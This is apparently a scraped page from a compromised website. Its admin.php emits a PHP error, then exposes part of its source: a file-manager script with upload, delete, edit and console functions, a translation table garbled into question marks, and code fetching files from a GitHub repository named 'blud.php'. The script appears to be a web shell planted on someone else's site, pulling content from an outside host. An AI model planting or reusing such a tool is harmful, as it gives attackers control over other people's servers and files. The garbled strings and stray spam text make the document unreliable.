<br />
<b>Warning</b>:  file_get_contents(https://raw.githubusercontent.com/bayu123-cpu/blud.php/refs/heads/main/blud.phpen.json): Failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found
 in <b>/home/u108859847/domains/thathappinessproject.in/public_html/admin.php</b> on line <b>92</b><br />门禁卡课s
<?php
...
$translation = '{"id":"ru","Add":"??????????","Are you sure you want to delete this directory (recursively)?":"???? ????????, ???? ??????? ???????? ???? ?????? (???????????)?","Are you sure you want to delete this file?":"???? ????????, ???? ??????? ???????? ????? ??????","Archiving":"??????????????","Authorization":"?????????????","Back":"???????","Cancel":"????????","Chinese":"???????????","Compress":"???????","Console":"?????????","Cookie":"??????","Created":"????????","Date":"??????","Days":"??????","Decompress":"?????????????","Delete":"?????????","Deleted":"?????????","Download":"?????????","done":"??????????","Edit":"???????????????","Enter":"??????","English":"????????????","Error occurred":"??????????? ???????","File manager":"?????????? ?????????","File selected":"???????? ?????","File updated":"?????? ?????????","Filename":"????? ??????","Files uploaded":"?????? ?????????","French":"?????????????","Generation time":"??????????? ?????????","German":"??????????","Home":"???????","Quit":"???????","Language":"??????","Login":"???????","Manage":"????????????","Make directory":"????????? ??????","Name":"??????????????","New":"???????","New file":"??????? ?????","no files":"???? ???????","Password":"????????","pictures":"????????????","Recursively":"????????????","Rename":"???????????????","Reset":"??????????","Reset settings":"?????????? ??????????","Restore file time after editing":"????????????????? ?????? ?????? ?????? ???????????????","Result":"???????????","Rights":"???????","Russian":"?????????","Save":"???????????","Select":"??????????","Select the file":"?????????? ?????","Settings":"???????????","Show":"??????????","Show size of the folder":"???????????? ??????? ??????","Size":"????????","Spanish":"???????????","Submit":"???????????","Task":"????????","templates":"????????","Ukrainian":"????????????","Upload":"???????????","Value":"??????????","Hello":"????????","Found in files":"????????? ?? ???????","Search":"???????","Recursive search": "????????????? ??????","Mask":"???????"}';
// end configuration
...
if ($lang['id']!=$language) {
	$get_lang = file_get_contents('https://raw.githubusercontent.com/bayu123-cpu/blud.php/refs/heads/main/blud.php' . $language . '.json');
	if (!empty($get_lang)) {
